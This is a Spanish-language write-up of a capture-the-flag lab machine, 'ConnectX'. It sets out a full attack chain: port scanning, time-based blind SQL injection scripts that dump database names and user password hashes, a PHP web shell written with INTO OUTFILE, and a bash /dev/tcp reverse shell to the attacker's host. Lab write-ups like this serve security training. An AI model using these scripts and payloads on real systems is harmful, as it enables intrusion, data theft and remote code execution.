---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ConnectX BugBountyLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 07:26 EDT
Nmap scan report for 192.168.1.151
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://connectx.bbl/
MAC Address: 08:00:27:7D:45:87 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```

Vemos que hay un puerto `80`, si entramos en el veremos que nos pide un dominio llamado `connectx.bbl`, para poder resolverlo lo añadiremos en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>               connectx.bbl
```

Lo guardamos y volveremos a cargar la pagina, una vez echo esto veremos una pagina en la que podemos registrarnos o iniciar sesion.

Vamos a comprobar si fuera el `login` vulnerable a un `SQL Injection`, pero vemos que no, por lo que vamos a registrarnos con cualquier usuario y si bajamos un poco veremos una opcion en la que se pueden filtrar por usuarios.

Podemos deducir que puede ser un punto de un `SQL Injection` si la entrada no se sanitiza de forma correcta, por lo que vamos a capturar la peticion de `filtrar` con `BurpSuite` y vamos a ponerle una `'` despues del `username` quedando de esta forma:

```
POST /home.php HTTP/1.1
Host: connectx.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://connectx.bbl
Connection: keep-alive
Referer: http://connectx.bbl/home.php
Cookie: PHPSESSID=2p22d88s8slu2kcae23emj941e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin'
```

Ahora si seleccionamos antes de enviar que nos muestre la respuesta del servidor:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cuando lo enviemos veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta dando un `error 500` por lo que con esto podemos saber que si es vulnerable a un `SQL Injection` ya que se lo esta tragando y esta cerrando la consulta proporcionando un error.

Ahora si intentamos esto otro:

```
POST /home.php HTTP/1.1
Host: connectx.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://connectx.bbl
Connection: keep-alive
Referer: http://connectx.bbl/home.php
Cookie: PHPSESSID=2p22d88s8slu2kcae23emj941e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin' OR 1=1-- -
```

Veremos que funciona en este caso seria un `200 OK` y nos muestra los `post` del usuario `admin` todos, por lo que esta funcionando esta inyeccion.

Vamos a intentar sacar el nombre de la base de datos, intentando el siguiente `payload`:

```
admin' or if(substr(database(),1,1)='c', sleep(5), 1)-- -
```

Tendra que quedar algo asi:

```
POST /home.php HTTP/1.1
Host: connectx.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://connectx.bbl
Connection: keep-alive
Referer: http://connectx.bbl/home.php
Cookie: PHPSESSID=2p22d88s8slu2kcae23emj941e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

username=admin'+or+if(substr(database(),1,1)='c',+sleep(5),+1)--+-
```

Vemos que si nos tarda `5` segundos en responder por lo que sabemos que la primera letra de la base de datos es `c`, puse esta letra de primeras ya que la maquina se llama `connectX`, pero vamos a realizar esto de forma un poco mas automatizada para sacar el nombre entero.

### Explicacion de payload

**`admin'`** → Cierra la comilla de la entrada esperada en SQL.**`OR`** → Introduce una nueva condición en la consulta SQL.**`IF(SUBSTR(DATABASE(),1,1)='c', SLEEP(5), 1)`** → Esta es la parte clave:\
\- `DATABASE()` → Obtiene el nombre de la base de datos actual.\
\- `SUBSTR(DATABASE(),1,1)` → Extrae el primer carácter del nombre de la base de datos.\
\- **Comparación**: Si este primer carácter es `'c'`, entonces:\
\- **`SLEEP(5)`** → La consulta esperará 5 segundos antes de continuar.\
\- Si el carácter **NO** es `'c'`, la consulta simplemente devuelve `1` y se ejecuta sin demora.**`--+-`** → Comentario para ignorar el resto de la consulta original.

***

#### **¿Qué logra este payload?**

* **Si la página tarda 5 segundos en responder**, significa que la primera letra de la base de datos es **"c"**.
* Si no hay retraso, se prueba con otro carácter.
* Se repite el proceso para la segunda letra, tercera, etc., hasta reconstruir todo el nombre de la base de datos.

Este método se usa en ataques de **SQL Injection Time-Based Blind**, cuando no se pueden ver directamente los resultados de la consulta en pantalla.

> databaseName.py

```python
import requests
import string
import time
from pwn import log
from termcolor import cprint
from colorama import init

# Inicializar colorama
init(autoreset=True)

# Configuración de la URL y encabezados
URL = "http://connectx.bbl/home.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://connectx.bbl",
    "Connection": "keep-alive",
    "Referer": "http://connectx.bbl/home.php",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=<COOKIE>"
}

# Caracteres a probar (mayúsculas y minúsculas)
CHARSET = string.ascii_letters  # abc...xyzABC...XYZ

def animar_letras(base, char_actual, longitud):
    """
    Función para mostrar la animación de letras probadas en tiempo real.
    Se actualiza cada vez que se prueba una nueva letra.
    """
    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
    cprint(f"Probando: {animacion}", 'yellow', end='\r')
    time.sleep(0.05)  # Pequeña pausa para la animación

def inferir_nombre_db():
    nombre_db = ""
    index = 1
    p = log.progress("Descubriendo nombre de la base de datos")

    while True:
        encontrado = False
        for char in CHARSET:
            animar_letras(nombre_db, char, index)  # Se ve cada letra probada en tiempo real

            # Enviamos la solicitud con la letra actual
            payload = f"username=admin'+or+if(substr(database(),{index},1)='{char}',sleep(5),1)--+-"
            inicio = time.time()
            requests.post(URL, headers=HEADERS, data=payload)
            tiempo_respuesta = time.time() - inicio

            # Si la respuesta tarda >= 5s, hemos encontrado la letra correcta
            if tiempo_respuesta >= 5:
                nombre_db += char  # Guardamos la letra correcta
                p.status(f"{nombre_db}")  # Actualizamos la barra de progreso
                encontrado = True
                break  # Salimos del bucle de caracteres, pasamos a la siguiente posición

        if not encontrado:
            break  # Si no encontramos más letras, terminamos el proceso

        index += 1  # Pasamos a la siguiente letra

    p.success(f"Nombre de la base de datos descubierto: {nombre_db}")
    mostrar_tabla_resultado(nombre_db)
    return nombre_db

def mostrar_tabla_resultado(nombre_db):
    """
    Muestra una mini tabla con el resultado final.
    """
    cprint("\n+--------------------+---------------------------+", 'cyan')
    cprint(f"| Nombre de la Base   | {nombre_db:<23} |", 'cyan')
    cprint("+--------------------+---------------------------+", 'cyan')

if __name__ == "__main__":
    inferir_nombre_db()
```

Reemplazamos `<COOKIE>` por la cookie que tengamos nosotros asignados en la pagina web, para que inicie sesion directamente, tendremos que ejecutarlo de la siguiente forma:

```sh
python3 databaseName.py
```

Info:

```
[+] Descubriendo nombre de la base de datos: Nombre de la base de datos descubierto: connectx
Probando: connectxZ
+--------------------+---------------------------+
| Nombre de la Base   | connectx                |
+--------------------+---------------------------+
```

Vemos que nos saca el nombre de la base de datos llamada `connectx`, por lo que ahora tendremos que saber las tablas que tiene dicha base de datos.&#x20;

Vamos a modificar el script un poco de la siguiente forma:

> tableName.py

```python
import requests
import string
import time
from pwn import log
from termcolor import cprint
from colorama import init

# Inicializar colorama
init(autoreset=True)

# Configuración de la URL y encabezados
URL = "http://connectx.bbl/home.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://connectx.bbl",
    "Connection": "keep-alive",
    "Referer": "http://connectx.bbl/home.php",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=<COOKIE>"
}

# Caracteres a probar (mayúsculas y minúsculas)
CHARSET = string.ascii_letters  # abc...xyzABC...XYZ

def animar_letras(base, char_actual, longitud):
    """
    Función para mostrar la animación de letras probadas en tiempo real.
    Se actualiza cada vez que se prueba una nueva letra.
    """
    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
    cprint(f"Probando: {animacion}", 'yellow', end='\r')
    time.sleep(0.05)  # Pequeña pausa para la animación

def inferir_tablas():
    tablas = []
    tabla_index = 0
    p = log.progress("Descubriendo nombres de tablas")

    while True:
        nombre_tabla = ""
        char_index = 1
        encontrada_tabla = False

        while True:
            encontrada_letra = False
            for char in CHARSET:
                animar_letras(nombre_tabla, char, char_index)

                payload = f"username=admin'+or+if(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema='connectx'+limit+{tabla_index},1),{char_index},1))={ord(char)},sleep(5),0)--+-"
                inicio = time.time()
                requests.post(URL, headers=HEADERS, data=payload)
                tiempo_respuesta = time.time() - inicio

                if tiempo_respuesta >= 5:
                    nombre_tabla += char
                    p.status(f"[{tabla_index}] {nombre_tabla}")
                    encontrada_letra = True
                    encontrada_tabla = True
                    break

            if not encontrada_letra:
                break  # Terminó el nombre de esta tabla

            char_index += 1

        if not encontrada_tabla:
            break  # No encontró ninguna letra para esta tabla. Fin.

        tablas.append(nombre_tabla)
        tabla_index += 1

    p.success("Descubrimiento de tablas completado")
    mostrar_tablas_resultado(tablas)
    return tablas

def mostrar_tablas_resultado(tablas):
    """
    Muestra una tabla con todos los nombres de tablas descubiertos.
    """
    cprint("\n+------------------------+", 'cyan')
    cprint("|   Tablas descubiertas  |", 'cyan')
    cprint("+------------------------+", 'cyan')
    for t in tablas:
        cprint(f"| {t:<22} |", 'cyan')
    cprint("+------------------------+", 'cyan')

if __name__ == "__main__":
    inferir_tablas()
```

Y lo ejecutaremos de la siguiente forma:

```shell
python3 databaseName.py
```

Info:

```
[+] Descubriendo nombres de tablas: Descubrimiento de tablas completado
Probando: ZsersZ
+------------------------+                                                     
|   Tablas descubiertas  |
+------------------------+
| posts                  |
| users                  |
+------------------------+
```

Vemos que tenemos dos tablas, entre ellas la que mas nos interesa es la informacion de la tabla `users`, por lo que modificaremos un poco el script tambien para poder sacar dicha informacion.

> columnsName.py

```python
import requests
import string
import time
from pwn import log
from termcolor import cprint
from colorama import init

# Inicializar colorama
init(autoreset=True)

URL = "http://connectx.bbl/home.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://connectx.bbl",
    "Connection": "keep-alive",
    "Referer": "http://connectx.bbl/home.php",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=<COOKIE>"
}

# Ampliar el conjunto de caracteres
CHARSET = string.ascii_letters + string.digits + "_@.-{}[]!#$%&*()+=^~<>?/|\\"

def animar_letras(base, char_actual, longitud):
    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
    cprint(f"Probando: {animacion}", 'yellow', end='\r')
    time.sleep(0.05)

def inferir_columnas(tabla):
    columnas = []
    index_col = 0
    p = log.progress("Descubriendo columnas")

    while True:
        col_name = ""
        char_index = 1
        encontrado = False

        while True:
            letra_encontrada = False
            for char in CHARSET:
                animar_letras(col_name, char, char_index)
                payload = f"username=admin'+or+if(ascii(substr((select+column_name+from+information_schema.columns+where+table_name='{tabla}'+limit+{index_col},1),{char_index},1))={ord(char)},sleep(3),0)--+-"
                inicio = time.time()
                requests.post(URL, headers=HEADERS, data=payload)
                if time.time() - inicio >= 5:
                    col_name += char
                    p.status(f"[{index_col}] {col_name}")
                    letra_encontrada = True
                    encontrado = True
                    break
            if not letra_encontrada:
                break
            char_index += 1

        if not encontrado:
            break
        columnas.append(col_name)
        index_col += 1

    p.success("Columnas encontradas")
    cprint(f"Columnas: {', '.join(columnas)}", 'cyan')
    return columnas

def inferir_valores(tabla, columnas):
    datos = []
    fila_index = 0
    p = log.progress("Extrayendo datos")

    while True:
        fila = {}
        any_data = False
        for columna in columnas:
            valor = ""
            char_index = 1

            # Detectamos si la columna podría ser una contraseña
            if 'password' in columna.lower():
                longitud_max = 50  # Establecemos una longitud máxima para la contraseña (ajustar según sea necesario)
            else:
                longitud_max = 10  # Para otras columnas limitamos la longitud a 10 caracteres (ajustar según sea necesario)

            while True:
                letra_encontrada = False
                for char in CHARSET:
                    animar_letras(valor, char, char_index)
                    payload = f"username=admin'+or+if(ascii(substr((select+{columna}+from+{tabla}+limit+{fila_index},1),{char_index},1))={ord(char)},sleep(5),0)--+-"
                    inicio = time.time()
                    requests.post(URL, headers=HEADERS, data=payload)
                    if time.time() - inicio >= 5:
                        valor += char
                        letra_encontrada = True
                        any_data = True
                        break
                if not letra_encontrada:
                    break
                char_index += 1
                if len(valor) >= longitud_max:
                    break
            fila[columna] = valor
            p.status(f"[Fila {fila_index}] {columna}: {valor}")

        if not any_data:
            break
        datos.append(fila)
        fila_index += 1

    p.success("Datos extraídos")
    mostrar_datos(tabla, columnas, datos)

def mostrar_datos(tabla, columnas, datos):
    cprint(f"\n+{'-' * 60}+", 'cyan')
    cprint(f"| Datos extraídos de la tabla '{tabla}'", 'cyan')
    cprint(f"+{'-' * 60}+", 'cyan')
    cprint(" | ".join([f"{col:<15}" for col in columnas]), 'cyan')
    cprint("-" * (17 * len(columnas)), 'cyan')
    for fila in datos:
        cprint(" | ".join([f"{fila[col]:<15}" for col in columnas]), 'cyan')
    cprint(f"+{'-' * 60}+", 'cyan')

if __name__ == "__main__":
    tabla = "users"
    columnas = inferir_columnas(tabla)
    inferir_valores(tabla, columnas)
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
python3 columnsName.py
```

Info:

```
[+] Descubriendo columnas: Columnas encontradas
Columnas: id, username, password, path
[+] Extrayendo datos: Datos extraídos
Probando: }ploads}
+------------------------------------------------------------+                    
| Datos extraídos de la tabla 'users'
+------------------------------------------------------------+
id              | username        | password        | path           
--------------------------------------------------------------------
1               | admin           | $2y$10$Nrvrm6mUYTTLEJdMOWipBe8MD3931kWGCt/K0dRPu8EkhohdURe4m                | uploads        
3               | diseo           | $2y$10$01t/7.AjDz672ds9ymTZbuRdRfgYRbx26kU2ZNta8j2                | uploads        
2               | kike            | $2y$10$01t/7.AjDz672ds9ymTZbuRdRfgYRbx26kU2ZNta8j2Agm/TfZaQS                | uploads        
+------------------------------------------------------------+
```

Vemos que nos saco las credenciales de forma correcta, pero si intentamos `crackearlo` no podremos por lo que no nos sirve de mucho, vamos a comprobar si se pudiera ejecutar codigo de forma remota mediante un `SQL Injection`, a esto se le llamaria `SQL Injection -> RCE`.

Si por ejemplo probamos a poner varios `payloads` de los pocos que me funciono fue el siguiente para escribir `test` en un fichero.

```
username=admin'+UNION+SELECT+'test'+INTO+OUTFILE+'/var/www/connectx.bbl/text.txt'--+-
```

Quedando de esta forma la peticion:

```
POST /home.php HTTP/1.1
Host: connectx.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://connectx.bbl
Connection: keep-alive
Referer: http://connectx.bbl/home.php
Cookie: PHPSESSID=ko1jjbi02plfk9dl2ft3oseh8u
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin'+UNION+SELECT+'test'+INTO+OUTFILE+'/var/www/connectx.bbl/text.txt'--+-
```

Si lo enviamos en la respuesta del servidor nos dara un `500 error` pero si nos vamos a la `URL` donde deberia de estar el archivo, veremos que funciono:

```
URL = http://connectx.bbl/text.txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora vamos hacer esto mismo, pero para subir un archivo en `PHP` y poder ejecutar codigo de forma remota mediante ese codigo en `PHP`.

```
username=admin'+union+select+'<?php+system($_GET[0]);+?>'+into+outfile+'/var/www/connectx.bbl/command.php'--+-
```

#### **Explicación:**

* **`'+union+select+'`**: Cierra la consulta original y comienza la inyección con `UNION SELECT`.
* **`'<?php+system($_GET[0]);+?>'`**: El código PHP a escribir en el archivo. Usa `system()` para ejecutar el comando recibido en la URL como `command=...`.
* **`into+outfile+'/var/www/connectx.bbl/command.php'`**: Especifica la ruta en la que el archivo PHP será escrito (`/var/www/connectx.bbl/command.php`).
* **`--+-`**: Comentario SQL para que no afecte al resto de la consulta.

Tendremos que tener esta peticion:

```
POST /home.php HTTP/1.1
Host: connectx.bbl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 236
Origin: http://connectx.bbl
Connection: keep-alive
Referer: http://connectx.bbl/home.php
Cookie: PHPSESSID=ko1jjbi02plfk9dl2ft3oseh8u
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin'+union+select+'<?php+system($_GET[0]);+?>'+into+outfile+'/var/www/connectx.bbl/command.php'--+-
```

Y si nos vamos a la sigueinte `URL`:

```
URL = http://connectx.bbl/command.php?0=whoami
```

Veremos que funciona:

<figure><img src="../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Ahora lo que haremos sera realizar una `reverse shell` de la siguiente forma:

```
command.php?0=bash -c "bash -i >%26 /dev/tcp/192.168.1.146/7777 0>%261"
```

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Si enviamos ese `payload` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.151] 34364
bash: cannot set terminal process group (508): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/connectx.bbl$ whoami
whoami
www-data
```

Vemos que ha funcionado por lo que tendremos que sanitizar la `shell` (TTY).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que vemos con esto ya habremos terminado la maquina y habremos aprovechado de forma correcta la vulnerabilidad, ahora leeremos la `flag`.

> flag.txt

```
bf5d5347e5f42004a51af934ccb9cf29
```
